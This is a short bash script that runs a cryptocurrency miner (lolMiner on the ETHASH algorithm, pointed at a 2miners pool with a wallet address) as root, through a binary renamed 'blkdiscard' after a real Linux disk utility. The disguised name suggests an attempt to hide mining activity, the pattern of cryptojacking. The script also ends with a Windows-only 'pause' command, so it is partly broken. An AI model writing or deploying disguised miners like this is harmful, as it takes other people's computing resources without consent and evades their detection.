#!/bin/bash

cd "$(dirname "$0")"

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 3JPLRMGt5wymA47349AB88Ldd52CVSEV7f.Harry --ethstratum ETHPROXY
pause
